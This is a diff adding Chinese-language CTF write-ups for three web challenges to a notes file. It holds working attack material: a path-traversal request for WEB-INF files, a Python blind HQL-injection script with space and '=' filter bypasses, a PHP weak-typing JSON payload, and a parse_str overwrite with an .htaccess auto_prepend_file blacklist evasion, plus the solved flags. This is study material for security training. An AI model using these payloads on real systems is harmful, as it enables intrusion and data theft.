@@ -819,6 +819,366 @@ http://47.88.218.105:20010/action.php?callback=%3Chtml%3E%3Cbody%3E%00%00%00%00%
 HITB{j50nP_1s_VulN3r4bLe}
 ```
 
+### Zhuanxv
+
+拿到网址:[http://111.198.29.45:38794](http://111.198.29.45:38794/),扫描后台发现登入界面,在后台的css处动态加载图片:
+
+```css
+
+    body{
+        background:url(./loadimage?fileName=web_login_bg.jpg) no-repeat center;
+        background-size: cover;
+    }
+```
+
+我们大致就可以猜到是利用文件读取漏洞,通过wappalyzer得知这是一个java的web站点
+
+java的web站点的目录结构
+
+![image.png](https://i.loli.net/2019/09/01/LduWtSfIh8bDA7Z.png)
+
+`loadimage?fileName=../../WEB-INF/web.xml`
+
+得到
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app id="WebApp_9" version="2.4"
+         xmlns="http://java.sun.com/xml/ns/j2ee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">
+    <display-name>Struts Blank</display-name>
+    <filter>
+        <filter-name>struts2</filter-name>
+        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
+    </filter>
+    <filter-mapping>
+        <filter-name>struts2</filter-name>
+        <url-pattern>/*</url-pattern>
+    </filter-mapping>
+    <welcome-file-list>
+        <welcome-file>/ctfpage/index.jsp</welcome-file>
+    </welcome-file-list>
+    <error-page>
+        <error-code>404</error-code>
+        <location>/ctfpage/404.html</location>
+    </error-page>
+</web-app>
+```
+
+需要关注的信息是:`<filter-name>struts2</filter-name>`这是一个采用了struts2框架的java站点
+
+**struts2 默认配置文件存放在 WEB-INF/classes/ 目录下** , 在该路径下可以拿到 `struts.xml` 配置文件
+
+通过struts.xml文件我们可以得到网站源码
+
+![](https://i.loli.net/2019/09/13/56jm4W9RPxVQut8.png)
+
+在源码里发现使用spring框架和hibernate框架
+
+Spring 核心配置文件为 : **applicationContext.xml**
+
+在配置文件里找到
+
+`<value>user.hbm.xml</value>`
+
+数据库映射表
+
+```xml
+
+
+<?xml version="1.0"?>
+<!DOCTYPE hibernate-mapping PUBLIC
+        "-//Hibernate/Hibernate Mapping DTD 3.0//EN"
+        "http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd">
+<hibernate-mapping package="com.cuitctf.po">
+    <class name="User" table="hlj_members">
+        <id name="id" column="user_id">
+            <generator class="identity"/>
+        </id>
+        <property name="name"/>
+        <property name="password"/>
+    </class>
+    <class name="Flag" table="bc3fa8be0db46a3610db3ca0ec794c0b">
+        <id name="flag" column="welcometoourctf">
+            <generator class="identity"/>
+        </id>
+        <property name="flag"/>
+    </class>
+</hibernate-mapping>
+```
+
+确认flag在数据库名为bc3fa8be0db46a3610db3ca0ec794c0b的flag字段中
+
+源码审计:
+
+```java
+
+public class UserDaoImpl
+  extends HibernateDaoSupport
+  implements UserDao
+{
+  public List<User> findUserByName(String name)
+  {
+    return getHibernateTemplate().find("from User where name ='" + name + "'");
+  }
+  
+  public List<User> loginCheck(String name, String password)
+  {
+    return getHibernateTemplate().find("from User where name ='" + name + "' and password = '" + password + "'");
+  }
+}
+```
+
+发现没有对用户输入进行过滤,存在sql注入
+
+**在 HQL 语句中查询的是实体类 , 实体类与数据表存在映射关系** , 这个映射关系就写在 `*.hbm.xml` 文件中 , **因此HQL语句中 from 后跟着的是实体类名 ' User ' , 而不是实际的表名 'hlj_members'** 
+
+程序会对空格和=进行过滤,绕过空格过滤 我们可以用换行符或`/**/`者来替换,不知道为什么`/**/`不能替换,是hsql语句不支持?
+
+=可以用 like来替换,不知道为什么不能用注释#,不过影响不大
+
+```python
+import requests
+url='http://111.198.29.45:41014/zhuanxvlogin'
+sql='''123'
+or
+(judge)
+or
+name
+like
+'admin'''
+judge='''((select
+ascii(substr(group_concat(id),index,1))
+from
+Flag
+where
+id<2)<guess)'''
+
+sql=sql.replace('judge',judge)
+index=1
+result=''
+while 1:
+    for i in range(32,128):
+        text=requests.post(url,data={'user.name':sql.replace('guess',str(i)).replace('index',str(index)),'user.password':'1'}).text
+        #print({'user.name':sql.replace('guess',str(i)).replace('index',str(index)),'user.password':'1'})
+        #input()
+        if 'Dream' in text:
+            result+=chr(i-1)
+            print(result)
+            
+            break
+    index+=1
+
+```
+
+flag:SCTF{C46E250926A2DFFD831975396222B08E}
+
+### lottery
+
+题目直接给了源代码。
+
+先快乐玩一玩,追踪购买flag和猜数字请求网页和参数。
+
+刚开始看到随机数以为是随机数的安全问题,后来发现这根本并不是2333.继续追踪发现关键代码
+
+```php
+$numbers = $req['numbers'];
+	$win_numbers = random_win_nums();
+	$same_count = 0;
+	for($i=0; $i<7; $i++){
+		if($numbers[$i] == $win_numbers[$i]){
+			$same_count++;
+		}
+	}
+```
+
+
+
+php的弱类型的锅23333
+
+发包`{"action":"buy","numbers":[true,true,true,true,true,true,true]}`
+
+疯狂拿钱买flag,我也是能买几十个flag的人:)
+
+cyberpeace{ba2ccbc6417d6539628d0042027b6848}
+
+### blgdel
+
+这题很有意思,刚开始看的时候以为会是sql注入,结果最后是奇葩的变量覆盖+.htaccess文件利用
+
+注册登录,sql注入,目录扫描都做一遍
+
+找到了sql.txt和config.txt
+
+```php
+<?php
+
+class master
+{
+	private $path;
+	private $name;
+	
+	function __construct()
+	{
+		
+	}
+	
+	function stream_open($path)
+	{
+		if(!preg_match('/(.*)\/(.*)$/s',$path,$array,0,9))
+			return 1;
+		$a=$array[1];
+		parse_str($array[2],$array);
+		
+		if(isset($array['path']))
+		{
+			$this->path=$array['path'];
+		}
+		else
+			return 1;
+		if(isset($array['name']))
+		{
+			$this->name=$array['name'];
+		}
+		else
+			return 1;
+		
+		if($a==='upload')
+		{
+			return $this->upload($this->path,$this->name);
+		}
+		elseif($a==='search')
+		{
+			return $this->search($this->path,$this->name);
+		}
+		else 
+			return 1;
+	}
+	function upload($path,$name)
+	{
+		if(!preg_match('/^uploads\/[a-z]{10}\/$/is',$path)||empty($_FILES[$name]['tmp_name']))
+			return 1;
+		
+		$filename=$_FILES[$name]['name'];
+		echo $filename;
+		
+		$file=file_get_contents($_FILES[$name]['tmp_name']);
+		
+		$file=str_replace('<','!',$file);
+		$file=str_replace(urldecode('%03'),'!',$file);
+		$file=str_replace('"','!',$file);
+		$file=str_replace("'",'!',$file);
+		$file=str_replace('.','!',$file);
+		if(preg_match('/file:|http|pre|etc/is',$file))
+		{
+			echo 'illegalbbbbbb!';
+			return 1;
+		}
+		
+		file_put_contents($path.$filename,$file);
+		file_put_contents($path.'user.jpg',$file);
+		
+		
+		echo 'upload success!';
+		return 1;
+	}
+	function search($path,$name)
+	{
+		if(!is_dir($path))
+		{
+			echo 'illegal!';
+			return 1;
+		}
+		$files=scandir($path);
+		echo '</br>';
+		foreach($files as $k=>$v)
+		{
+			if(str_ireplace($name,'',$v)!==$v)
+			{
+				echo $v.'</br>';
+			}
+		}
+		
+		return 1;
+	}
+	
+	function stream_eof()
+	{
+		return true;
+	}
+	function stream_read()
+	{
+		return '';
+	}
+	function stream_stat()
+	{
+		return '';
+	}
+	
+}
+
+stream_wrapper_unregister('php');
+stream_wrapper_unregister('phar');
+stream_wrapper_unregister('zip');
+stream_wrapper_register('master','master');
+
+?>
+```
+
+
+
+```php
+CREATE DATABASE `sshop` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;
+USE `sshop`;
+CREATE TABLE `sshop`.`users` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `username` varchar(255) NULL DEFAULT NULL,
+  `mail` varchar(255) NULL DEFAULT NULL,
+  `password` varchar(255) NULL DEFAULT NULL,
+  `point` varchar(255) NULL DEFAULT NULL,
+  `shopcar` varchar(255) NULL DEFAULT NULL,
+  PRIMARY KEY (`id`)
+) DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
+```
+
+sql.txt迷惑了我一段时间,最后是我自己的惰性拯救了我,让我懒得去sql注入
+
+分析config.txt
+
+upload函数根本不可能上传php代码
+
+在stream_open()函数中:`parse_str($array[2],$array);`存在变量覆盖的问题
+
+`master://search/path=xxx&name=xxx&path=wanted`
+
+最后的结果为`$path=wanted`
+
+结合search就可以遍历目录了
+
+懒得写脚本手动遍历233333
+
+但是实际测试的时候发现根本没有办法输入/导致我卡了好久
+
+最后看别人的wp发现将/ url编码后可以目录变量23333这是啥？？？
+
+最后找到flag的payload为:
+
+name:`f&path=..%2f..%2f..%2f..%2fhome`
+
+![image.png](https://i.loli.net/2019/09/24/gSG7tVquT4bARjk.png)
+
+接下来就是考虑如何读取flag了
+
+利用.htaccess的设置php_value auto_prepend_file /home/hiahiahia_flag
+
+由于pre在黑名单中最后的内容为
+
+`php_value auto_pr\
+epend_file /home/hiahiahia_flag`
+
+![image.png](https://i.loli.net/2019/09/24/YNZnlJ4fHC3ycKa.png)
+
 ## bugku
 
 ### login3
